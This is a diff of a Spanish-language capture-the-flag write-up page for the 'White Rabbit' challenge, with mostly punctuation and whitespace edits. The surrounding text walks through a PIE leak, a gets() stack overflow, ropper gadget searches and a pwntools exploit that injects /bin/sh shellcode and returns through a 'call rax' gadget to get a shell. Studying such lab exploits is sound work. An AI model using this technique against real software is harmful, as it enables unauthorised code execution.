@@ -144,7 +144,7 @@
 <section class="post" id="reversing">
 <br><h3 class="post-title">Reversing</h3><br>
 
-<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/WhiteRabbit/white_rabbit">binario</a> nos muestra una dirección en <code class="language-plaintext highlighter-rouge">x64</code> que por ahora no sabemos que es y nos parece que espera algo, probablemente necesitemos enviar una entrada</p>
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/WhiteRabbit/white_rabbit">binario</a> nos muestra una dirección en <code class="language-plaintext highlighter-rouge">x64</code> que por ahora no sabemos que es y nos parece que espera algo, probablemente necesitemos enviar una entrada.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ./white_rabbit</span><span class="p">
 
@@ -152,14 +152,14 @@
   ( •_•)
   / > 0x6319864fd180
 
-follow the white rabbit...  
+follow the white rabbit...
 AAAAAAAABBBBBBBB</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Iniciamos desensamblando el main <code class="language-plaintext highlighter-rouge">main</code>, este inicia llamando a <code class="language-plaintext highlighter-rouge">printf</code> mostrando en formato <code class="language-plaintext highlighter-rouge">%p</code> como puntero la dirección de la función <code class="language-plaintext highlighter-rouge">main</code> cargada en memoria</p>
+<p class="plain-text">Iniciamos desensamblando el <code class="language-plaintext highlighter-rouge">main</code>, este inicia llamando a <code class="language-plaintext highlighter-rouge">printf</code> mostrando en formato <code class="language-plaintext highlighter-rouge">%p</code> como puntero la dirección de la función <code class="language-plaintext highlighter-rouge">main</code> cargada en memoria.</p>
 <a href="/challenges/whiterabbit/1.png" target="_blank"><div><p><img src="/challenges/whiterabbit/1.png"></p></div></a>
 
-<p class="plain-text">Podemos comprobarlo desde <code class="language-plaintext highlighter-rouge">gdb</code>, corremos y comprobamos que la dirección mostrada es la del <code class="language-plaintext highlighter-rouge">main</code> y pertenece al binario, si le restamos la dirección base del binario obtenemos el offset, entonces al restar <code class="language-plaintext highlighter-rouge">0x1180</code> al leak obtenemos la base</p>
+<p class="plain-text">Podemos comprobarlo desde <code class="language-plaintext highlighter-rouge">gdb</code>, corremos y comprobamos que la dirección mostrada es la del <code class="language-plaintext highlighter-rouge">main</code> y pertenece al binario, si le restamos la dirección base del binario obtenemos el offset, entonces al restar <code class="language-plaintext highlighter-rouge">0x1180</code> al leak obtenemos la base.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ gdb </span><span class="p">-q white_rabbit
 Reading symbols from </span><span class="p">white_rabbit</span><span class="p">...
@@ -175,7 +175,7 @@ Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/l
 follow the white rabbit...
 ^C
 Program received signal SIGINT, Interrupt.
-</span><span class="az">0x00007ffff7d1ba61 </span><span class="p">in</span><span class="am"> __GI___libc_read</span><span class="p"> (</span><span class="az">fd</span><span class="p">=0, </span><span class="az">buf</span><span class="p">=0x7ffff7e03963 &lt_IO_2_1_stdin_+131>, </span><span class="az">nbytes</span><span class="p">=1)  
+</span><span class="az">0x00007ffff7d1ba61 </span><span class="p">in</span><span class="am"> __GI___libc_read</span><span class="p"> (</span><span class="az">fd</span><span class="p">=0, </span><span class="az">buf</span><span class="p">=0x7ffff7e03963 &lt_IO_2_1_stdin_+131>, </span><span class="az">nbytes</span><span class="p">=1)
 </span><span class="ro">pwndbg></span><span class="p"> x/i 0x555555555180
    </span><span class="az">0x555555555180</span><span class="p"> &lt</span><span class="am">main</span><span class="p">>:</span><span class="ve">	push</span><span class="ro">   rbp</span><span class="p">
 </span><span class="ro">pwndbg></span><span class="p"> vmmap 0x555555555180
@@ -189,7 +189,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos automatizar todo este proceso desde un exploit en <code class="language-plaintext highlighter-rouge">python</code>, recibimos la dirección y le restamos el offset para obtener la dirección base del binario</p>
+<p class="plain-text">Podemos automatizar todo este proceso desde un exploit en <code class="language-plaintext highlighter-rouge">python</code>, recibimos la dirección y le restamos el offset para obtener la dirección base del binario.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, log
@@ -197,18 +197,18 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./white_rabbit"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
 shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
-binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180</span><span class="p">  
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180</span><span class="p">
 
 log.info(</span><span class="no">f</span><span class="s">"Binary base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
 
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el exploit nos muestra la dirección base que calculamos del binario y si la comparamos con lo que nos devuelve <code class="language-plaintext highlighter-rouge">gdb</code> del proceso actual es la misma, de esta forma logramos evadir la protección <code class="language-plaintext highlighter-rouge">PIE</code> que aunque esta activa deja de afectarnos</p>
+<p class="plain-text">Al ejecutar el exploit nos muestra la dirección base que calculamos del binario y si la comparamos con lo que nos devuelve <code class="language-plaintext highlighter-rouge">gdb</code> del proceso actual es la misma, de esta forma logramos evadir la protección <code class="language-plaintext highlighter-rouge">PIE</code> que aunque esta activa deja de afectarnos.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 29067
-[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './white_rabbit']  
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './white_rabbit']
 [</span><span class="az">*</span><span class="p">] Binary base: 0x60dbb4bd2000
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 
@@ -219,7 +219,7 @@ follow the white rabbit...
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">^C
 Program received signal SIGINT, Interrupt.
-</span><span class="az">0x00007e8f3fd1ba61 </span><span class="p">in</span><span class="am"> __GI___libc_read </span><span class="p">(</span><span class="az">fd</span><span class="p">=0, </span><span class="az">buf</span><span class="p">=0x7e8f3fe03963 &lt_IO_2_1_stdin_+131>, </span><span class="az">nbytes</span><span class="p">=1)  
+</span><span class="az">0x00007e8f3fd1ba61 </span><span class="p">in</span><span class="am"> __GI___libc_read </span><span class="p">(</span><span class="az">fd</span><span class="p">=0, </span><span class="az">buf</span><span class="p">=0x7e8f3fe03963 &lt_IO_2_1_stdin_+131>, </span><span class="az">nbytes</span><span class="p">=1)
     at ../sysdeps/unix/sysv/linux/read.c:26
 </span><span class="ro">pwndbg></span><span class="p"> vmmap white_rabbit
 LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
@@ -233,10 +233,10 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Luego de todo el leak muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> y llama a la función <code class="language-plaintext highlighter-rouge">follow</code></p>
+<p class="plain-text">Luego de todo el leak muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> y llama a la función <code class="language-plaintext highlighter-rouge">follow</code>.</p>
 <a href="/challenges/whiterabbit/2.png" target="_blank"><div><p><img src="/challenges/whiterabbit/2.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">follow</code> llama a <code class="language-plaintext highlighter-rouge">gets</code> para recibir datos en un buffer en <code class="language-plaintext highlighter-rouge">rbp - 112</code>, como no se controla la cantidad de datos a recibir tenemos un posible buffer overflow</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">follow</code> llama a <code class="language-plaintext highlighter-rouge">gets</code> para recibir datos en un buffer en <code class="language-plaintext highlighter-rouge">rbp - 112</code>, como no se controla la cantidad de datos a recibir tenemos un posible buffer overflow.</p>
 <a href="/challenges/whiterabbit/3.png" target="_blank"><div><p><img src="/challenges/whiterabbit/3.png"></p></div></a>
 
 </section>
@@ -244,24 +244,24 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 <section class="post" id="exploitation">
 <br><h3 class="post-title">Explotación</h3><br>
 
-<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, en este binario solo está habilitado el <code class="language-plaintext highlighter-rouge">PIE</code> que vuelve aleatoria la dirección base del binario, sin embargo ya la tenemos</p>
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, en este binario solo está habilitado el <code class="language-plaintext highlighter-rouge">PIE</code> que vuelve aleatoria la dirección base del binario, sin embargo ya la tenemos.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec</span><span class="p"> white_rabbit
 [</span><span class="az">*</span><span class="p">] '/home/user/white_rabbit'
     Arch:       amd64-64-little
     RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
     Stack:      </span><span class="ro">No canary found</span><span class="p">
-    NX:         </span><span class="am">NX unknown - GNU_STACK missing</span><span class="p">  
+    NX:         </span><span class="am">NX unknown - GNU_STACK missing</span><span class="p">
     PIE:        </span><span class="ve">PIE enabled</span><span class="p">
     Stack:      </span><span class="ro">Executable</span><span class="p">
     RWX:        </span><span class="ro">Has RWX segments</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">112 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">rbp</code>, <code class="language-plaintext highlighter-rouge">8 B's</code> que seran el valor de rbp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack</p>
+<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">112 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">rbp</code>, <code class="language-plaintext highlighter-rouge">8 B's</code> que serán el valor de rbp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> -q
 >>> b"A" * 112 + b"B" * 8 + b"C" * 8 + b"D" * 24
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD'  
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD'
 >>></span>
 </code></pre></div></div><br>
 
@@ -278,7 +278,7 @@ Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/l
   / > 0x555555555180
 
 follow the white rabbit...
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD  
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD
 
 Program received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x000055555555517f </span><span class="p">in</span><span class="am"> follow</span><span class="p"> () at</span><span class="ve"> warmup.c</span><span class="p">:11
@@ -291,9 +291,9 @@ Program received signal SIGSEGV, Segmentation fault.
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ya que controlamos el return address y los datos del stack podriamos intentar saltar al <code class="language-plaintext highlighter-rouge">rsp</code> y ejecutar el shellcode, sin embargo no hay ningun gadget que lo ejecute</p>
+<p class="plain-text">Ya que controlamos el return address y los datos del stack podriamos intentar saltar al <code class="language-plaintext highlighter-rouge">rsp</code> y ejecutar el shellcode, sin embargo no hay ningun gadget que lo ejecute.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper</span><span class="p"> --file white_rabbit --jmp rsp  
+<code><span class="ve">❯ ropper</span><span class="p"> --file white_rabbit --jmp rsp
 
 JMP Instructions
 ================
@@ -301,16 +301,16 @@ JMP Instructions
 0 gadgets found</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos aprovecharnos del hecho de que <code class="language-plaintext highlighter-rouge">gets</code> como return value devuelve un puntero al buffer de destino, por lo que en <code class="language-plaintext highlighter-rouge">rax</code> que es donde se guarda el valor de retorno deberiamos tener una dirección que apunta al inicio de nuestro buffer</p>
+<p class="plain-text">Podemos aprovecharnos del hecho de que <code class="language-plaintext highlighter-rouge">gets</code> como return value devuelve un puntero al buffer de destino, por lo que en <code class="language-plaintext highlighter-rouge">rax</code> que es donde se guarda el valor de retorno deberiamos tener una dirección que apunta al inicio de nuestro buffer.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> x/s $rax
-</span><span class="az">0x7fffffffe240</span><span class="p">:	'A' &ltrepetidos 112 veces>, "BBBBBBBBCCCCCCCC", 'D' &ltrepetidos 24 veces>  
+</span><span class="az">0x7fffffffe240</span><span class="p">:	'A' &ltrepetidos 112 veces>, "BBBBBBBBCCCCCCCC", 'D' &ltrepetidos 24 veces>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">ropper</code> direcciones a donde podemos saltar encontramos varias instrucciones que llaman a <code class="language-plaintext highlighter-rouge">rax</code>, con lo que volveriamos al inicio del <code class="language-plaintext highlighter-rouge">input</code></p>
+<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">ropper</code> direcciones a donde podemos saltar encontramos varias instrucciones que llaman a <code class="language-plaintext highlighter-rouge">rax</code>, con lo que volveriamos al inicio del <code class="language-plaintext highlighter-rouge">input</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper</span><span class="p"> --file white_rabbit --jmp rax  
+<code><span class="ve">❯ ropper</span><span class="p"> --file white_rabbit --jmp rax
 
 JMP Instructions
 ================
@@ -322,7 +322,7 @@ JMP Instructions
 3 gadgets found</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Iniciamos con un shellcode el cual nos ejecutara una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al return address, en el ejecutaremos el <code class="language-plaintext highlighter-rouge">call rax</code> que llama al inicio del buffer y como en el inicio enviamos el shellcode se ejecutará y nos dará la shell</p>
+<p class="plain-text">Iniciamos con un shellcode el cual nos ejecutará una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al return address, en el ejecutaremos el <code class="language-plaintext highlighter-rouge">call rax</code> que llama al inicio del buffer y como en el inicio enviamos el shellcode se ejecutará y nos dará la shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import </span><span class="p">process, p64, asm
@@ -330,7 +330,7 @@ JMP Instructions
 shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./white_rabbit"</span><span class="p">)
 
 shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
-binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180  </span><span class="p">
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180</span><span class="p">
 
 shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
     push 0x3b                 # execve()
@@ -362,7 +362,7 @@ shell.interactive()</span>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
-[</span><span class="ve">+</span><span class="p">] Starting local process './white_rabbit': pid 27593  
+[</span><span class="ve">+</span><span class="p">] Starting local process './white_rabbit': pid 27593
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">id
 uid=1000(user) gid=1000(user) groups=1000(user)
